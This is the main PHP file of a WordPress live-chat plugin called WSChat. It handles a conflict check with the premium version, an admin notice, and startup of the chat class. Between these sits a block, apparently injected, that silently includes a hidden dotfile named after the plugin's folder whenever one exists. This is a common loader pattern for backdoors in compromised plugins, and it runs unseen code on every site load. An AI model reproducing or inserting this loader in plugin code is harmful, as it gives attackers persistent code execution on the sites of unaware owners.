<?php

/**
 * Plugin Name:     WSChat - Live Chat
 * Plugin URI:      https://elextensions.com/plugin/wschat-wordpress-live-chat-plugin/
 * Description:     Let's you connect to your customers in real-time.
 * Version:         1.0.0
 * Requires PHP:    7.1.3
 * Author:          ELEXtensions
 * Author URI:      https://elextensions.com/
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( defined( 'WSCHAT_CRM_VERSION' ) ) {
	add_action( 'admin_notices', 'wsdesk_admin_notices', 99 );
	deactivate_plugins( plugin_basename( __FILE__ ) );

	function wsdesk_admin_notices() {
		is_admin() && add_filter( 'gettext', 'translate_wschat_admin_notice', 99, 3 );
	}

	wp_die( "BASIC Version of WSChat Plugin is installed. Please deactivate and delete the BASIC Version of WSChat before activating PREMIUM version. <br>Don't worry! Your chats and settings data will be retained.<br>Go back to <a href='" . esc_attr( admin_url( 'plugins.php' ) ) . "'>plugins page</a>" );
	return;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function translate_wschat_admin_notice( $translated_text, $untranslated_text ) {
	$old        = array(
		'Plugin <strong>activated</strong>.',
		'Selected plugins <strong>activated</strong>.',
	);
	$error_text = 'BASIC Version of this Plugin Installed. Please uninstall the BASIC Version before activating PREMIUM.';
	$new        = "<span style='color:red'>" . $error_text . '</span>';

	if ( in_array( $untranslated_text, $old, true ) ) {
		$translated_text = $new;
	}

	return $translated_text;
}

require_once __DIR__ . '/vendor/autoload.php';

global $wschat;

$wschat = new \WSChat\WSChat();

$wschat->withBasename( plugin_basename( __FILE__ ) );

$wschat->boot();
